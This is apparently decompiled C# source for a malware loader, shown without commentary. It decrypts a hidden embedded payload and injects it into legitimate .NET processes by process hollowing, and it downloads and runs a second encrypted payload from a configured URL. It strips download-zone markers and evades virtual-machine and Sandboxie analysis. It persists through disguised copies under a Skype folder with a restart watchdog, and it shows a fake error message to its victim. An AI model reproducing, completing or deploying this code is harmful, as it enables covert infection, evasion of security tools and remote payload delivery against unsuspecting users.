public class Deles
{
    // Fields
    private static byte[] FileData;
    private static string injectionPath;
    private static bool Kill;
    private static readonly Messenger Messenger = new Messenger();
    private static bool Run;

    // Methods
    public static void Ando()
    {
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Skype";
        if (!Directory.Exists(path))
        {
            Directory.CreateDirectory(path);
        }
        string str3 = path + @"\bridgemigplugin.exe";
        string str4 = path + @"\FlashUtil__ActiveX.exe";
        if (!Directory.Exists(path))
        {
            Directory.CreateDirectory(path);
        }
        bool flag2 = Convert.ToBoolean(fileName.ToLower() != str3.ToLower());
        DeleteFile(fileName + ":Zone.Identifier");
        Ping();
        int timestamp = GetTimestamp();
        Pack pack = new Pack();
        byte[] data = ReadManagedResource(timestamp.ToString(CultureInfo.InvariantCulture));
        object[] objArray = pack.Deserialize(Decrypt(data, timestamp.ToString(CultureInfo.InvariantCulture)));
        FileData = (byte[]) objArray[0];
        int num2 = (int) objArray[1];
        int num3 = num2 * 5;
        bool flag3 = (bool) objArray[2 + num3];
        bool flag4 = (bool) objArray[3 + num3];
        byte num4 = (byte) objArray[4 + num3];
        bool flag5 = (bool) objArray[5 + num3];
        string caption = objArray[6 + num3].ToString();
        string text = objArray[7 + num3].ToString();
        bool flag6 = (bool) objArray[8 + num3];
        bool flag7 = (bool) objArray[9 + num3];
        bool flag8 = (bool) objArray[10 + num3];
        bool flag9 = (bool) objArray[11 + num3];
        string uriString = (string) objArray[12 + num3];
        string pass = (string) objArray[13 + num3];
        bool flag10 = (bool) objArray[14 + num3];
        bool flag11 = (bool) objArray[15 + num3];
        int num5 = (int) objArray[0x10 + num3];
        bool flag12 = (bool) objArray[0x11 + num3];
        injectionPath = string.Empty;
        switch (num4)
        {
            case 0:
                injectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "AppLaunch.exe");
                break;

            case 1:
                injectionPath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
                break;

            case 2:
                injectionPath = fileName;
                break;
        }
        if (flag9)
        {
            try
            {
                string str9 = (num5 == -1) ? Path.GetTempPath() : Environment.GetFolderPath((Environment.SpecialFolder) num5);
                WebClient client = new WebClient();
                Uri address = new Uri(uriString);
                byte[] bytes = Decrypt(client.DownloadData(address), pass);
                if (flag10)
                {
                    string str10 = flag11 ? address.LocalPath : Path.ChangeExtension(Path.GetRandomFileName(), Path.GetExtension(address.LocalPath));
                    str10 = Path.Combine(str9, str10);
                    DeleteFile(str10 + ":Zone.Identifier");
                    if (Path.GetFileName(str10) == Path.GetFileNameWithoutExtension(str10))
                    {
                        str10 = Path.ChangeExtension(str10, "exe");
                    }
                    File.WriteAllBytes(str10 + "exe", bytes);
                    Process.Start(str10);
                }
                else
                {
                    RunPE(bytes, injectionPath);
                }
            }
            catch (Exception)
            {
            }
        }
        if (flag7 && VMRunning())
        {
            Environment.Exit(0);
        }
        if (flag8 && antiSandie())
        {
            Environment.Exit(0);
        }
        if (flag6)
        {
            FileData = Decompress(FileData);
        }
        if (flag5 && flag2)
        {
            MessageBox.Show(text, caption, MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if ((num2 != 0) && flag2)
        {
            for (int i = 0; i < num2; i++)
            {
                int num7 = i * 5;
                string str11 = (string) objArray[num7 + 2];
                Environment.SpecialFolder folder = (Environment.SpecialFolder) objArray[num7 + 3];
                FileAttributes fileAttributes = (FileAttributes) objArray[num7 + 4];
                bool flag13 = (bool) objArray[num7 + 5];
                byte[] buffer2 = (byte[]) objArray[num7 + 6];
                DeleteFile(folder + ":Zone.Identifier");
                if (flag6)
                {
                    buffer2 = Decompress(buffer2);
                }
                if (flag13)
                {
                    string str12 = Path.Combine(Environment.GetFolderPath(folder), str11);
                    File.WriteAllBytes(str12, buffer2);
                    File.SetAttributes(str12, fileAttributes);
                    Process.Start(str12);
                }
                else
                {
                    RunPE(buffer2, injectionPath);
                }
            }
        }
        if (flag3)
        {
            DeleteFile(str4 + ":Zone.Identifier");
            try
            {
                if (File.Exists(str3) && File.Exists(str3))
                {
                    File.Delete(str3);
                }
                if (File.Exists(str4) && File.Exists(str4))
                {
                    File.Delete(str4);
                }
            }
            catch (Exception)
            {
            }
            try
            {
                object[] arguments = new object[] { fileName, str3 };
                bool[] copyBack = new bool[] { true, true };
                NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Scripting.FileSystemObject", "")), null, "CopyFile", arguments, null, null, copyBack, true);
            }
            catch (Exception)
            {
            }
            try
            {
                File.WriteAllBytes(str4, Resource1.FlashUtil__ActiveX);
            }
            catch (Exception)
            {
            }
        }
        try
        {
            RunPE(FileData, injectionPath);
            if (flag12)
            {
                try
                {
                    Thread thread2 = new Thread(new ThreadStart(Deles.MonitorInjection)) {
                        IsBackground = true
                    };
                    thread2.Start();
                }
                catch
                {
                }
            }
        }
        catch
        {
        }
        if (flag3)
        {
            while (!Kill)
            {
                try
                {
                    if (Process.GetProcessesByName("FlashUtil__ActiveX").Length == 0)
                    {
                        Process.Start(str4);
                    }
                }
                catch
                {
                }
                Thread.Sleep(100);
            }
        }
        if (flag4)
        {
            try
            {
                string str13 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "cscservice.exe");
                if (File.Exists(str13))
                {
                    File.Delete(str13);
                }
                File.Move(fileName, str13);
                Process.Start(str13);
                ProjectData.EndApp();
            }
            catch
            {
            }
        }
        ProjectData.EndApp();
    }

    private static bool antiSandie()
    {
        foreach (Process process in Process.GetProcesses())
        {
            string str;
            if ((((str = process.ProcessName.ToLower()) != null) && (str == "sandboxierpcss")) && (Process.GetCurrentProcess().SessionId == process.SessionId))
            {
                Environment.Exit(0);
            }
        }
        return false;
    }

    private static byte[] Decompress(byte[] data)
    {
        MemoryStream stream = new MemoryStream(data, 4, data.Length - 4, false);
        DeflateStream stream2 = new DeflateStream(stream, CompressionMode.Decompress);
        byte[] buffer = new byte[(BitConverter.ToInt32(data, 0) - 1) + 1];
        stream2.Read(buffer, 0, buffer.Length);
        stream2.Close();
        return buffer;
    }

    private static byte[] Decrypt(byte[] data, string pass)
    {
        byte[] src = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(pass));
        byte[] dst = new byte[8];
        Buffer.BlockCopy(src, 0, dst, 0, dst.Length);
        DESCryptoServiceProvider provider2 = new DESCryptoServiceProvider {
            Key = dst,
            IV = dst,
            Mode = CipherMode.CBC
        };
        return provider2.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern bool DeleteFile(string name);
    private static int GetTimestamp()
    {
        IntPtr baseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
        int num = Marshal.ReadInt32(baseAddress, 60);
        return Marshal.ReadInt32(baseAddress, num + 8);
    }

    private static void MonitorInjection()
    {
        try
        {
            if (RoRp.ProcessId == -1)
            {
                return;
            }
            Process.GetProcessById(RoRp.ProcessId).WaitForExit(0x7fffffff);
            RunPE(FileData, injectionPath);
        }
        catch
        {
        }
        MonitorInjection();
    }

    private static void Ping()
    {
        Messenger.Pong += new Messenger.PongEventHandler(Deles.Pong);
        Messenger.Ping();
        Thread.Sleep(0x9c4);
        Run = true;
    }

    private static void Pong()
    {
        if (Run)
        {
            Kill = true;
            Thread.Sleep(0x7d0);
            Environment.Exit(0);
        }
    }

    private static byte[] ReadManagedResource(string name)
    {
        Stream manifestResourceStream = Assembly.GetEntryAssembly().GetManifestResourceStream(name);
        if (manifestResourceStream != null)
        {
            byte[] buffer = new byte[Convert.ToInt32(manifestResourceStream.Length)];
            manifestResourceStream.Read(buffer, 0, buffer.Length);
            return buffer;
        }
        return new byte[0];
    }

    private static void RunPE(byte[] data, string path)
    {
        RoRp.Run(path, string.Empty, data);
    }

    private static bool VMRunning()
    {
        List<string> list = new List<string>();
        ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Description FROM Win32_VideoController");
        foreach (ManagementObject obj2 in searcher.Get())
        {
            if (obj2["Description"] != null)
            {
                list.Add(Convert.ToString(obj2["Description"]).Trim().ToLower());
            }
        }
        return (list.Contains("virtualbox graphics adapter") || (list.Contains("vmware svga ii") || list.Contains("vm additions s3 trio32/64")));
    }
}
